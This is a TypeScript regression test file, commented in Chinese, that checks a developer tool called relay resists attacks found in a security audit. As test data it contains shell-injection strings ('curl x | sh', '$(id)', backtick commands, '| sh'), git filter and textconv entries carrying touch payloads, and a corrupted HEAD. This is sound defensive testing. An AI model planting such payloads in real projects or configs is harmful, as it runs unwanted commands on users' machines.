import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

/**
 * 2026-10-02 安全审计里复现过的攻击，复核后改成的反例：
 * 项目里被改过的检查命令不自动跑、快照仓库的 config 和 .gitattributes 不能让 git 执行命令、
 * 快照仓库 HEAD 写坏了自己指回去、账本里形状不对的事件不采信、桌面程序的打开命令只认 open -a。
 * 威胁从哪来：项目文件夹里的东西——克隆来的仓库、「只在项目里」的 AI 都改得到 .relay。
 */

// 这个文件里的测试不碰你真实的家目录（接力台的数据）。
const HOME = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'relay-security-home-')));
process.env.HOME = HOME;
process.env.RELAY_HOME = path.join(HOME, '.relay');
process.env.RELAY_SCAN_APPS = 'off';
process.env.RELAY_LOGIN_PATH = 'off';
process.env.RELAY_AUTODETECT = 'off';
fs.mkdirSync(process.env.RELAY_HOME, { recursive: true });

/* eslint-disable @typescript-eslint/no-require-imports */
const config = require('../src/core/config') as typeof import('../src/core/config');
const ledger = require('../src/core/ledger') as typeof import('../src/core/ledger');
const notes = require('../src/core/notes') as typeof import('../src/core/notes');
const registry = require('../src/core/registry') as typeof import('../src/core/registry');
const snap = require('../src/core/snap') as typeof import('../src/core/snap');
const init = require('../src/ops/init') as typeof import('../src/ops/init');
const track = require('../src/ops/track') as typeof import('../src/ops/track');
/* eslint-enable @typescript-eslint/no-require-imports */

const GATE_OK = path.join(process.env.RELAY_HOME, 'gate-ok.json');

function tmpDir(name: string): string {
  return fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), `relay-${name}-`)));
}

function project(name: string): { root: string; write: (rel: string, text: string) => void } {
  const root = tmpDir(name);
  fs.writeFileSync(path.join(root, 'README.md'), 'demo\n');
  init.initProject(root);
  notes.setTask(root, '写一个 a.txt', []);
  const write = (rel: string, text: string) => {
    fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
    fs.writeFileSync(path.join(root, rel), text);
  };
  return { root, write };
}

const handoff = `# 交接：Codex · gpt-6-astra\n\n- 工具：Codex\n- 模型：gpt-6-astra\n- 状态：已交接\n\n## 做了什么\n\n- 改了文件\n`;
fs.writeFileSync(
  path.join(process.env.RELAY_HOME, 'agents.json'),
  JSON.stringify({ agents: [{ name: 'codex', label: 'Codex', kind: 'cli', cmd: 'codex', tier: 'strong', model: 'gpt-6-astra', harness: 'codex' }] })
);

test('检查命令：项目里写进来的（克隆来的、正在干活的 AI 改的）不自动跑；设置里保存过的才跑，之后再被改又不跑', async () => {
  const { root, write } = project('gate-confirm');
  config.ensureGateOk(); // 接力台启动：这时项目里还没有检查命令
  const mark = path.join(tmpDir('gate-mark'), 'ran');
  const evil = { gate: { command: `touch ${mark}` }, protectedPaths: [] };
  write('.relay/config.json', JSON.stringify(evil));
  write('.relay/交接/第1棒-1002-2200-codex.md', handoff);
  write('a.txt', '1\n');
  await track.trackAndGate(root);
  const stint = (id: number) => ledger.loadLedger(root).stints.find((s) => s.id === id)!;
  assert.equal(fs.existsSync(mark), false, '以前这里检查命令在对账后直接就跑了');
  assert.equal(stint(1).gate?.status, 'error');
  assert.equal(stint(1).gate?.detail, config.GATE_UNCONFIRMED);

  // 网页「设置 → 项目」保存（人看过）：跑
  config.saveRelayConfig(root, evil);
  write('.relay/交接/第2棒-1002-2210-codex.md', handoff);
  write('b.txt', '2\n');
  await track.trackAndGate(root);
  assert.equal(stint(2).gate?.status, 'pass');
  assert.ok(fs.existsSync(mark));

  // 之后项目里的配置又被改了：不跑
  fs.rmSync(mark);
  write('.relay/config.json', JSON.stringify({ gate: { command: `touch ${mark} && true` }, protectedPaths: [] }));
  write('.relay/交接/第3棒-1002-2220-codex.md', handoff);
  write('c.txt', '3\n');
  await track.trackAndGate(root);
  assert.equal(stint(3).gate?.status, 'error');
  assert.equal(fs.existsSync(mark), false);
});

test('检查命令：升级上来第一次运行时，最近打开过、接入过的项目现有的检查命令算确认过；没打开过的（克隆来的）不算', () => {
  fs.rmSync(GATE_OK, { force: true });
  const { root: known, write } = project('gate-known'); // 接入时记进了最近打开的项目
  write('.relay/config.json', JSON.stringify({ gate: { command: 'npm test' }, protectedPaths: [] }));
  const cloned = tmpDir('gate-cloned');
  fs.mkdirSync(path.join(cloned, '.relay'));
  fs.writeFileSync(path.join(cloned, '.relay', 'config.json'), JSON.stringify({ gate: { command: 'npm test' }, protectedPaths: [] }));
  config.ensureGateOk();
  assert.equal(config.gateConfirmed(known, 'npm test'), true);
  assert.equal(config.gateConfirmed(cloned, 'npm test'), false);
  assert.equal(config.gateConfirmed(known, 'npm test; curl x | sh'), false, '改过就不算');
  assert.equal(config.gateConfirmed(cloned, ''), true, '没配检查命令：不用跑');
});

test('快照仓库：config 里加了 filter、textconv，项目里放 .gitattributes，存快照、看改动、退回都不执行；HEAD 写坏了指回原来的分支，以前的快照都在', () => {
  const { root, write } = project('snap-filter');
  const s1 = snap.takeSnapshot(root, '一');
  const mark = path.join(tmpDir('snap-mark'), 'ran');
  const cfg = path.join(root, '.relay', 'snapshots', 'config');
  fs.appendFileSync(cfg, `[filter "x"]\n\tclean = touch ${mark}; cat\n\tsmudge = touch ${mark}; cat\n[diff "x"]\n\ttextconv = touch ${mark}; cat\n[include]\n\tpath = /tmp/nowhere\n`);
  write('.gitattributes', '* filter=x diff=x\n');
  write('a.txt', '1\n');
  const s2 = snap.takeSnapshot(root, '二');
  assert.equal(s2.changed, true);
  snap.snapDiff(root, s1.sha, s2.sha);
  snap.restoreSnapshot(root, s1.sha);
  assert.equal(fs.existsSync(mark), false, '以前 git add 时 filter 就执行了');
  assert.doesNotMatch(fs.readFileSync(cfg, 'utf8'), /filter|textconv|include/);
  assert.match(fs.readFileSync(cfg, 'utf8'), /bare = true/, 'git 建库时写的那几项还在');

  fs.writeFileSync(path.join(root, '.relay', 'snapshots', 'HEAD'), 'garbage\n');
  write('b.txt', '2\n');
  const s3 = snap.takeSnapshot(root, '三');
  assert.equal(s3.changed, true, '以前 HEAD 写坏以后快照一直报错');
  assert.ok(snap.snapExists(root, s1.sha) && snap.snapExists(root, s2.sha), '以前的快照都还在（不是挪走重建）');
});

test('账本：形状不对的事件不采信（2^53 的棒号、不像快照号的退回和起点），不会开出一棒永远「进行中」', () => {
  const T = '2026-10-02T13:00:00.000Z';
  const v = ledger.viewLedger([
    { type: 'init', ts: T, snap: 'S0' },
    { type: 'stint', ts: T, stint: { id: 2 ** 53, status: 'working', startedAt: T } },
    { type: 'rollback', ts: T, to: 'S0', label: '第 1 棒之前', safety: 'X', after: '$(id)', dropped: [] },
    { type: 'base', ts: T, snap: '../../x' },
  ] as never);
  assert.equal(v.stints.length, 0);
  assert.equal(v.open, null);
  assert.equal(v.base, 'S0');
  assert.equal(v.lastRollback, null);
});

test('桌面程序的打开命令只认 open -a 程序 {{dir}}：带 shell 写法的保存时就拦下', () => {
  for (const ok of ['open -a Cursor {{dir}}', 'open -a "Xiaomi MiMo" {{worktree}}', 'open -a Claude "{{dir}}"', 'open -a 微信 {{dir}}']) assert.equal(registry.isOpenCommand(ok), true, ok);
  for (const bad of ['touch /tmp/x # {{dir}}', 'open -a Cursor {{dir}}; id', 'open -a "$(id)" {{dir}}', 'open -a `id` {{dir}}', 'echo $(id) {{dir}}', 'cursor {{dir}}', 'open -a Cursor {{dir}} | sh']) {
    assert.equal(registry.isOpenCommand(bad), false, bad);
  }
  assert.throws(() => registry.normalizeAgent({ name: 'evil', kind: 'app', tier: 'weak', cmd: 'touch /tmp/x # {{dir}}' }), /open -a/);
  assert.throws(() => registry.normalizeAgent({ name: 'c', kind: 'cli', tier: 'weak', cmd: 'codex', app: 'open -a X {{dir}}; id' }), /open -a/);
  // 命令行成员的启动命令不经过 shell：Windows 路径里的反斜杠照样能存（「再加一位」会照抄它）
  assert.equal(registry.normalizeAgent({ name: 'w', kind: 'cli', tier: 'weak', cmd: 'C:\\Users\\me\\claude.exe' }).cmd, 'C:\\Users\\me\\claude.exe');
});
